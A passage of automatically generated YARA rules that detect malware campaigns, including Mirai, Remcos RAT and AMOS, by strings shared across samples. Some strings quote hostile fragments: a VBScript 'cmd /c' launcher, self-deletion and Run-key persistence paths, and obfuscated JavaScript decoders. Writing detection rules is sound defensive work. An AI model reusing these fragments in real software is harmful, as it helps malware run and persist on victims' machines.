        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 4.22 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = " !9999\"#$%9999&'()9999*+,-9999./0199992345999967899999:;<=9999>?@A9999BCDE9999FGHI9999JKLM9999NOPQ99" ascii
        $s3 = "MNOrrrrPRTUrrrrVWYZrrrr[\\_`rrrrabcdrrrrefhi9rrrjk" ascii
        $s4 = "(!PROT_EXEC|PROT_WRITE failed." ascii
        $s5 = "9999 \"$%9999&/56999979:<9999DGHI9999_`ab9999c" ascii
        $s6 = "'\\/`iMiM7d?hiMiMGlOpiMiMWt_x" ascii
        $s7 = "sion.skip_lock_after_retrl" ascii
        $s8 = "GCC: (Ubuntu 12.4.0-2u" ascii
        $s9 = "Wo3hJHr5jfDKYmvLOyT" ascii
        $s10 = "'Wr%C345%Wr%67`%Wr89." ascii
        $s11 = "_X3.4-1968//TR\"LI" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_host_04401f15_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-04401f15"
        date = "2026-10-26"
        campaign = "host-04401f15"
        family = "mirai"
        hash = "1cce1c2c539ed3520b9daad17822996e9c9199bed23b01a8319646ae0033895e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-04401f15.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
        $s2 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s3 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s4 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" ascii
        $s5 = "HOST: 255.255.255.255:1900" ascii
        $s6 = "MAN: \"ssdp:discover\"" ascii
        $s7 = "M-SEARCH * HTTP/1.1" ascii
        $s8 = "service:service-agent" ascii
        $s9 = "FICMUHDKPJKCF" ascii
        $s10 = "objectClass0" ascii
        $s11 = "NKLWZQJGNN\"" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}

rule Sightlines_host_1db65dc7_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-1db65dc7"
        date = "2026-10-18"
        campaign = "host-1db65dc7"
        family = "mirai"
        hash = "006fe5e7d106546adda59d96a9509bc7ca21757c0b5d22c3f44565182652bba4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-1db65dc7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/usr/local/bin/bash" ascii
        $s1 = "/usr/bin/busybox" ascii
        $s2 = "/data/local/tmp" ascii
        $s3 = "/tmp/.Kdat_tmp" ascii
        $s4 = "/usr/bin/bash" ascii
        $s5 = "/usr/bin/sh" ascii
        $s6 = ".comment" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2114176 and 6 of them
}

rule Sightlines_tlsh_18a0c52c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-18a0c52c"
        date = "2026-10-18"
        campaign = "tlsh-18a0c52c"
        family = ""
        hash = "2ff9ff956650c6180b0f64bdf389e36cc4eb4eb4fc28cd6be716f43c1b083a06"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-18a0c52c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = "PROT_EXEC|PROT_WRITE failed." ascii
        $s3 = "GCC: (Ubuntu 11.4.0-1u" ascii
        $s4 = "hk@hIBC_2.3.4nKVp" ascii
        $s5 = "pthread_mutex_loc" ascii
        $s6 = "GLOBAL_OFFSET_TABL" ascii
        $s7 = "3D3K3M*3O3Y3[6$6%" ascii
        $s8 = "Sjuantech54Fl" ascii
        $s9 = "inc9recLfaileC" ascii
        $s10 = " SOCKS5 on :%d" ascii
        $s11 = "feUco>47450</" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_4f993e69_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-4f993e69"
        date = "2026-10-17"
        campaign = "imphash-4f993e69"
        family = ""
        hash = "2ce6a4a50f9862f7338d077f9cefd90a02997c28add53588ad0e43c74bf750a7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-4f993e69.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "6d0da78}\"/><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/></application></compatibility><" ascii
        $s1 = "ortedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f" ascii
        $s2 = "_ZTVNSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stri" ascii
        $s3 = "*NSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stringI" ascii
        $s4 = "_ZNSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_string" ascii
        $s5 = "_ZTINSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stri" ascii
        $s6 = "_ZTSNSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stri" ascii
        $s7 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><application><supportedOS Id=\"{e20" ascii
        $s8 = "11457-1546-43c5-a5fe-008deee3d3f0}\"/><supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/><supp" ascii
        $s9 = ".pdata$_ZNK12_GLOBAL__N_121system_error_category10equivalentEiRKSt15error_condition" ascii
        $s10 = ".xdata$_ZNK12_GLOBAL__N_121system_error_category10equivalentEiRKSt15error_condition" ascii
        $s11 = ".pdata.unlikely._ZNSt12_GLOBAL__N_1L14__throw_syserrEiPKc" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7660322 and 12 of them
}

rule Sightlines_imphash_3c5e4aaa_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-3c5e4aaa"
        date = "2026-10-16"
        campaign = "imphash-3c5e4aaa"
        family = ""
        hash = "184146852727a9db4eea06178716bec3cdbb1015c911f6b0f915b184ad7775b2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-3c5e4aaa.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "svbfloat16" ascii
        $s1 = "svfloat16" ascii
        $s2 = "svfloat32" ascii
        $s3 = "svfloat64" ascii
        $s4 = "svuint16" ascii
        $s5 = "svuint32" ascii
        $s6 = "svuint64" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 7 of them
}

rule Sightlines_tlsh_4ee03782_remcosrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4ee03782"
        date = "2026-10-17"
        campaign = "tlsh-4ee03782"
        family = "remcosrat"
        hash = "710482ef543f6dadf62abd92b4216e18aba48cad65829186fc5c6974d0b852c8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4ee03782.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "https://pro.ip-api.com/line/?key=QPVvv1rHQJD2pd2&fields=25948155" wide
        $s1 = "Copyright (c) by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED." ascii
        $s2 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" ascii
        $s3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ascii
        $s4 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" wide
        $s5 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" wide
        $s6 = "CreateObject(\"Scripting.FileSystemObject\").DeleteFile(Wscript.ScriptFullName)" wide
        $s7 = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" wide
        $s8 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\" wide
        $s9 = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall" ascii
        $s10 = "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" wide
        $s11 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1502288 and 12 of them
}

rule Sightlines_imphash_9071c961_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-9071c961"
        date = "2026-10-17"
        campaign = "imphash-9071c961"
        family = ""
        hash = "172cb9ab2e82ead2757946af852df3e8569cb0ce4dbc9229f7b7e38cedaed11f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-9071c961.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/> " ascii
        $s1 = "      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/> " ascii
        $s2 = "      <!--The ID below indicates application support for Windows 8.1 -->" ascii
        $s3 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s4 = "      <!--The ID below indicates application support for Windows 10 -->" ascii
        $s5 = "      <!--The ID below indicates application support for Windows 7 -->" ascii
        $s6 = "      <!--The ID below indicates application support for Windows 8 -->" ascii
        $s7 = "      <!--The ID below indicates application support for Windows Vista -->" ascii
        $s8 = "        <requestedExecutionLevel level=\"asInvoker\"/>" ascii
        $s9 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s10 = "Partial loss of significance (PLOSS)" ascii
        $s11 = "Total loss of significance (TLOSS)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_b49b9096_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b49b9096"
        date = "2026-10-16"
        campaign = "tlsh-b49b9096"
        family = ""
        hash = "3ea03e28c0a5a8c8a4910f26b2a1ee073053f76cbd9d21729dcec81543ac1617"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b49b9096.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "Brzina vodenog kola: Prosjek 14.8 o/min (vrh 18.2)" wide
        $s4 = "Efektivni raspon plime danas: {0:0.00} m (Sizik: {1:0.00} m | Kvadratura: {2:0.00} m)" wide
        $s5 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s6 = "Iskoristivost mljevenja: {0:0.1}% fino bra" wide
        $s7 = "Brzina vodenog kola: Prosjek {0:0.1} o/min (vr" wide
        $s8 = "Radni sati po ovoj plimi: {0:0.1} h efektivnog mljevenja" wide
        $s9 = "no spremljen u XML validiran prema MlinDnevnikShema.xsd:" wide
        $s10 = "Kvadraturni manjak: Nema gubitaka (pun pogonski potencijal)" wide
        $s11 = "Potencijalna energija po plimi: {0:N0} kWh" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1841152 and 12 of them
}

rule Sightlines_tlsh_f970b1f7_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f970b1f7"
        date = "2026-10-16"
        campaign = "tlsh-f970b1f7"
        family = ""
        hash = "097556fb58f7fcae9dba3c87410b1ee29c6d8185388929cde9afefc7dc55bbfa"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f970b1f7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "var _tmpx=[34,83,66,74,87,34],_tmpk=7,_tmp=\"\"; for(var _tmpi=0;_tmpi<_tmpx.length;_tmpi++)_tmp+=_xF(" ascii
        $s1 = "var _mtx=[72,96,113,109,106,97,118,90],_mtk=5,_mt=\"\"; for(var _mti=0;_mti<_mtx.length;_mti++)_mt+=_x" ascii
        $s2 = "var _swx=[87,108,107,115,83,109,106,96,107,115],_swk=4,_sw=\"\"; for(var _swi=0;_swi<_swx.length;_swi+" ascii
        $s3 = "var _dfx=[74,107,98,107,122,107,72,103,98,107],_dfk=14,_df=\"\"; for(var _dfi=0;_dfi<_dfx.length;_dfi+" ascii
        $s4 = "var hex = (value & 0xFFFF).toString(16).toUpperCase();" ascii
        $s5 = "var _itmx=[74,119,102,110],_itmk=3,_itm=\"\"; for(var _itmi=0;_itmi<_itmx.length;_itmi++)_itm+=_xF(_it" ascii
        $s6 = "var childAttribute = new NS_Mdl.Element();" ascii
        $s7 = "toyKey = secret.hexKey ? secret.toyKey : ((pmk[0] << 8) | pmk[1]) & 0xFFFF;" ascii
        $s8 = "var _ipx=[69,98,92,109,126,109,97,105,120,105,126,127],_ipk=12,_ip=\"\"; for(var _ipi=0;_ipi<_ipx.leng" ascii
        $s9 = "var ImportOverwriteMode = { Stubs: \"Stubs\", All: \"All\" };" ascii
        $s10 = "var attributes = new NS_Mdl.ElementArray();" ascii
        $s11 = "var _flrx=[111,101,102,102,123],_flrk=9,_flr=\"\"; for(var _flri=0;_flri<_flrx.length;_flri++)_flr+=_x" ascii
    condition:
        filesize < 2870714 and 12 of them
}

rule Sightlines_signer_cert_sha1_055cf2db_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-055cf2db"
        date = "2026-10-16"
        campaign = "signer_cert_sha1-055cf2db"
        family = ""
        hash = "086e083da4e7a46438aff3188beb2c0d14cb38af216c62a880cd8209dfcfcca8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-055cf2db.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "250911201113Z0t1" ascii
        $s1 = "230012+5029260" ascii
        $s2 = "240912201113Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2816096 and 3 of them
}

rule Sightlines_tlsh_322cdf80_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-322cdf80"
        date = "2026-10-16"
        campaign = "tlsh-322cdf80"
        family = ""
        hash = "0f8976cee8d60f7c8c2826f36db4a09f30fff94effb652cabca2efda9b4c2bf2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-322cdf80.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "'System.Globalization.DateTimeFormatInfo+" ascii
        $s5 = "+System.Globalization.GregorianCalendarTypes" ascii
        $s6 = "matInfo&System.Globalization.GregorianCalendar" ascii
        $s7 = "(System.Globalization.DateTimeFormatFlags" ascii
        $s8 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator" ascii
        $s9 = "Izvoz nije uspio ili datoteka ne zadovoljava XSD." wide
        $s10 = "ene zadane vrijednosti (nisu spremljene)." wide
        $s11 = "FAD8FE75086C160174BE22832BEBEBC9DA04C4CB395275AD8ADB10EA3A949B3F" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1713152 and 12 of them
}

rule Sightlines_tlsh_1cb5eb26_amos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1cb5eb26"
        date = "2026-10-16"
        campaign = "tlsh-1cb5eb26"
        family = "amos"
        hash = "57a671a61a6fbebe17b09d9baa5712d3b0af8232fd807697183c6b1fb67286a4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1cb5eb26.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation" ascii
        $s1 = "/System/Library/Frameworks/Security.framework/Versions/A/Security" ascii
        $s2 = "/usr/lib/libSystem.B.dylib" ascii
        $s3 = "/usr/lib/libc++.1.dylib" ascii
        $s4 = "@___stack_chk_guard" ascii
        $s5 = "@dyld_stub_binder" ascii
        $s6 = "@_mach_task_self_" ascii
        $s7 = "@___stack_chk_fail" ascii
        $s8 = "@_pthread_once" ascii
        $s9 = "__la_symbol_ptr" ascii
        $s10 = "__mod_init_func" ascii
        $s11 = "@___clear_cache" ascii
    condition:
        filesize < 2661984 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_9beec038_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-9beec038"
        date = "2026-10-16"
        campaign = "dotnet_typelib_guid-9beec038"
        family = ""
        hash = "152d4753839330b04a221d9e97093de27dcf5a4231fbd948940da26d909dd5b1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-9beec038.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "Brzina vodenog kola: Prosjek 14.8 o/min (vrh 18.2)" wide
        $s3 = "Efektivni raspon plime danas: {0:0.00} m (Sizik: {1:0.00} m | Kvadratura: {2:0.00} m)" wide
        $s4 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s5 = "Iskoristivost mljevenja: {0:0.1}% fino bra" wide
        $s6 = "Brzina vodenog kola: Prosjek {0:0.1} o/min (vr" wide
        $s7 = "Radni sati po ovoj plimi: {0:0.1} h efektivnog mljevenja" wide
        $s8 = "no spremljen u XML validiran prema MlinDnevnikShema.xsd:" wide
        $s9 = "Kvadraturni manjak: Nema gubitaka (pun pogonski potencijal)" wide
        $s10 = "Potencijalna energija po plimi: {0:N0} kWh" wide
        $s11 = "Datoteka PodaciKonfiguracije.xml nije prona" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2622464 and 12 of them
}

rule Sightlines_tlsh_3275a08d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3275a08d"
        date = "2026-10-16"
        campaign = "tlsh-3275a08d"
        family = ""
        hash = "05e61a33cd451d1496c7cf05a3f7bf739708ad2198d1ef2f05dc1f5eb2236138"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3275a08d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "Kondicija goveda pri silasku (BCS): {0:F2} / 5.00" wide
        $s2 = "Pomuzeno mlijeka: {0:N1} litara (Prosjek po grlu: {1:F1} L/sezoni)" wide
        $s3 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s4 = "Kondicija goveda pri silasku (BCS): 4.30" wide
        $s5 = "Rani snijeg: PRISILNI SILAZAK U TIJEKU! Stado se povla" wide
        $s6 = "Procjena vrijednosti sira: {0:N2} EUR (24.50 " wide
        $s7 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s8 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s9 = "Proizvodnja sira: {0} koluta (~{1} kg tvrdog planinskog sira)" wide
        $s10 = "no izvezeni u XML prema StadoPodaci.xsd shemi!" wide
        $s11 = "Ocjena: Izvrsno (A+) - Vrhunska transhumanca" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1937408 and 12 of them
}

rule Sightlines_tlsh_363a15b5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-363a15b5"
        date = "2026-10-16"
        campaign = "tlsh-363a15b5"
        family = ""
        hash = "adb8c2a61d8e539016e06a43c1a6b051978021660e9f3245d1107fe9d29af078"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-363a15b5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "Rok pokrovitelja: rukopis predan, {0:0.0} od {1} mjeseci" wide
        $s4 = "Pisari rade pri dnevnom svjetlu ({0:0.0} h svjetla)." wide
        $s5 = "Tinta dostaje za oko {3:0} folija, pergament za {4:0} folija." wide
        $s6 = "The value for column 'DataColumn2' in table 'DataTable1' is DBNull." wide
        $s7 = "The value for column 'DataColumn3' in table 'DataTable1' is DBNull." wide
        $s8 = "The value for column 'DataColumn4' in table 'DataTable1' is DBNull." wide
        $s9 = "The value for column 'DataColumn5' in table 'DataTable1' is DBNull." wide
        $s10 = "The value for column 'DataColumn1' in table 'DataTable1' is DBNull." wide
        $s11 = "Dnevno svjetlo: {0:0.0} h, radnih sati: {1:0.0}" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1712128 and 12 of them
}

rule Sightlines_signer_cert_sha1_8f60bad4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-8f60bad4"
        date = "2026-10-16"
        campaign = "signer_cert_sha1-8f60bad4"
        family = ""
        hash = "23f04ba936568e9a7c9dce7a6beb52c9be7eb13b734cd390c99e7546cbe1973d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-8f60bad4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "AddTrust External TTP Network1\"0 " ascii
        $s1 = ".?AV_Iostream_error_category@std@@" ascii
        $s2 = "AddTrust External CA Root0" ascii
        $s3 = "Melnikova st. 15, 5 apt.1" ascii
        $s4 = "mail.to.twaego@gmail.com0" ascii
        $s5 = "UTN-USERFirst-Object0" ascii
        $s6 = "Artem Shevchenko0" ascii
        $s7 = "Artem Shevchenko1" ascii
        $s8 = "AddTrust AB1&0$" ascii
        $s9 = "Salt Lake City1" ascii
        $s10 = "301231235959Z0|1" ascii
        $s11 = "200530104838Z0z1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 30458592 and 11 of them
}

rule Sightlines_signer_cert_sha1_b0e443fb_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-b0e443fb"
        date = "2026-10-16"
        campaign = "signer_cert_sha1-b0e443fb"
        family = ""
        hash = "052a2258a185f4c858326ff1a5754b2c4c2bf680c12ebf30a3c2b2b9c1af8f68"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-b0e443fb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<http://cert.ssl.com/SSLcom-SubCA-CodeSigning-RSA-4096-R1.cer0 " ascii
        $s1 = "Ehttp://www.ssl.com/repository/SSLcomRootCertificationAuthorityRSA.crt0 " ascii
        $s2 = "+SSL.com Code Signing Intermediate CA RSA R10" ascii
        $s3 = "(SSL.com Root Certification Authority RSA0" ascii
        $s4 = "https://www.ssl.com/repository0" ascii
        $s5 = "Pelican Finland Holding Oy0" ascii
        $s6 = "Pelican Self Storage1#0!" ascii
        $s7 = "SSL Corporation110/" ascii
        $s8 = "270826130109Z0v1" ascii
        $s9 = "410212173939Z0|1" ascii
        $s10 = "341112185005Z0n1" ascii
        $s11 = "341112185005Z0s1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 24638128 and 12 of them
}

rule Sightlines_tlsh_ff965ad2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ff965ad2"
        date = "2026-10-15"
        campaign = "tlsh-ff965ad2"
        family = ""
        hash = "24f1dfaa9847f556973ea2443051646a3e6adf8991b3ef5e193e9642d8efaa8b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ff965ad2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s6 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s7 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s8 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s9 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s10 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________alloc_____collections\\btree\\map\\entry.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_55d38a5e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-55d38a5e"
        date = "2026-10-15"
        campaign = "tlsh-55d38a5e"
        family = ""
        hash = "2dc4cd857195e02522a9a4c666c69c263517ded672775911241bdcb39af36b5a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-55d38a5e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "knownArmAmdGcnAarch64AsmjsAvrBpfebBpfelHexagonX86_32M68kLoongArch64Mips32Mips64Msp430Nvptx64Pulley32" ascii
        $s1 = "HelloExtensionWrongGroupForKeyShareUnsolicitedEchExtensionAES_128_GCMAES_256_GCMCHACHA20_POLY_1305EX" ascii
        $s2 = "SizeLimitExhaustedInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7" ascii
        $s3 = "StringLinkerNoteMetadataElfCompilationLinkageDynamicAarch64_Ilp32BpfCskyE2K32E2K64I386X86_64_X32Mips" ascii
        $s4 = "PskKeyExchangeModeHpkeSymmetricCipherSuitekdf_idaead_idWebPkiSupportedAlgorithms { all: [ .. ], mapp" ascii
        $s5 = "CritEdgeSSABBBranchEntryLiveinDisallowedBranchArgTooManyLiveRegsU6x0x1x2x3x4x5x6x7x8x9x10x11x12x13x1" ascii
        $s6 = "vmctxassertion failed: !(res.read_bit(BIT_LITTLE_ENDIAN) && res.read_bit(BIT_BIG_ENDIAN))" ascii
        $s7 = "assertion failed: max <= MAX_LOWERED_TYPES" ascii
        $s8 = "GenericX86SignedX86RipRelativeX86RipRelativeMovqX86BranchS390xDblAArch64CallLoongArchBranchSharcType" ascii
        $s9 = "rowSwitchI64Add128I64Sub128I64MulWideSI64MulWideUAcqRelSeqCstEngineModuleRecGroupModuleInternedTypeI" ascii
        $s10 = "iCudaCygwinDarwinDragonflyEmscriptenEspidfFreebsdFuchsiaHaikuHermitHorizonHurdIllumosIOSL4reLinuxMac" ascii
        $s11 = "assertion failed: len >= size_of::<c::sockaddr_in>()_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 11484160 and 12 of them
}

rule Sightlines_tlsh_0e4f7d14_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0e4f7d14"
        date = "2026-10-15"
        campaign = "tlsh-0e4f7d14"
        family = ""
        hash = "0234f3afddedb16450e7f9c51ec55a3c935ce568806a7c1888aae048d44ae441"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0e4f7d14.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7" ascii
